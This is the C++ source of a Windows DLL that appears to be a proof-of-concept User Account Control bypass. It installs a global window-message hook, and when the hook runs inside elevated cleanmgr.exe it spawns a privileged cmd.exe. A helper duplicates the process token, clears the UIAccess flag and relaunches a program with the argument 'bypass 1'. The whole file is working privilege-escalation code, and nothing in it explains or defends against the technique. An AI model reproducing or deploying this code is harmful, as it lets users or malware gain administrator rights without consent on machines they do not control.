// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <strsafe.h>
#include <string>
#include <Shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

static const char* IsElevated()
{
	DWORD elevated = 0;
	DWORD len;
	if (!GetTokenInformation(GetCurrentProcessToken(), TokenElevation, &elevated, sizeof(elevated), &len))
	{
		return "?";
	}
	return elevated ? "true" : "false";
}

static const char* IsUIAccess()
{
	DWORD ui_access = 0;
	DWORD len;
	if (!GetTokenInformation(GetCurrentProcessToken(), TokenUIAccess, &ui_access, sizeof(ui_access), &len))
	{
		return "?";
	}
	return ui_access ? "true" : "false";
}

static std::wstring GetModuleName()
{
	WCHAR buffer[MAX_PATH];
	GetModuleFileName(nullptr, buffer, MAX_PATH);
	return PathFindFileName(buffer);
}

static void PrintAttachMessage(bool attach)
{
	char buffer[128];
	StringCchPrintfA(buffer, sizeof(buffer), "%ls (%s) - PID: %d Elevated: %s UIAccess: %s\r\n",
		GetModuleName().c_str(), attach ? "Attach" : "Detach", GetCurrentProcessId(), IsElevated(), IsUIAccess());
	OutputDebugStringA(buffer);
}

class ScopedHandle {
private:
	HANDLE _handle;

public:
	ScopedHandle() : _handle(nullptr) {}
	ScopedHandle(HANDLE handle) : _handle(handle) {}
	~ScopedHandle() {
		if (!_handle || _handle == INVALID_HANDLE_VALUE) {
			return;
		}

		CloseHandle(_handle);
	}
	ScopedHandle(const ScopedHandle&) = delete;
	ScopedHandle operator=(const ScopedHandle*) = delete;
	ScopedHandle(ScopedHandle&& other) noexcept {
		_handle = other._handle;
		other._handle = nullptr;
	}

	HANDLE* ptr() {
		return &_handle;
	}
	HANDLE get() const {
		return _handle;
	}
	bool valid() const {
		return !!_handle;
	}
	HANDLE detach() {
		HANDLE ret = _handle;
		_handle = nullptr;
		return ret;
	}
};

bool StartProcess(LPCWSTR path)
{
	ScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, token.ptr()))
	{
		OutputDebugString(L"Error opening process token\n");
		return false;
	}

	ScopedHandle dup_token;
	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, dup_token.ptr())) {
		OutputDebugString(L"Error duplicating process token\n");
		return false;
	}

	DWORD uiaccess = 0;
	if (!SetTokenInformation(dup_token.get(), TokenUIAccess, &uiaccess, sizeof(uiaccess)))
	{
		OutputDebugString(L"Error clearing UI access flag\n");
		return false;
	}

	STARTUPINFO start_info = {};
	PROCESS_INFORMATION proc_info = {};
	WCHAR cmdline[] = L"bypass 1";
	BOOL result = CreateProcessAsUser(dup_token.get(), path, cmdline, nullptr,
		nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info);
	if (!result) {
		OutputDebugString(L"Error creating process\n");
		return false;
	}
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	return true;
}


static HHOOK g_hook = nullptr;
static HINSTANCE g_instance = nullptr;
static bool g_spawned = false;

static LRESULT CALLBACK HookWndProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (!g_spawned)
	{
		g_spawned = true;
		if (IsElevated() && _wcsicmp(GetModuleName().c_str(), L"cleanmgr.exe") == 0)
		{
			OutputDebugStringA("Creating privileged command prompt\n");
			STARTUPINFO start_info = {};
			PROCESS_INFORMATION proc_info = {};
			WCHAR cmdline[] = L"cmd.exe";
			BOOL result = CreateProcess(nullptr, cmdline, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr,
				nullptr, &start_info, &proc_info);
			if (!result)
			{
				OutputDebugStringA("Error creating process\n");
			}
			else {
				CloseHandle(proc_info.hProcess);
				CloseHandle(proc_info.hThread);
			}
		}
	}

	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

bool SetupHook() {
	if (g_hook) {
		return true;
	}
	OutputDebugStringA("Setting up Windows hook.");
	g_hook = SetWindowsHookExW(WH_CALLWNDPROC, HookWndProc, g_instance, 0);
	return g_hook != nullptr;
}

bool RemoveHook() {
	if (!g_hook) {
		return true;
	}

	return !!UnhookWindowsHookEx(g_hook);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		PrintAttachMessage(true);
		g_instance = hModule;
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
		PrintAttachMessage(false);
        break;
    }
    return TRUE;
}


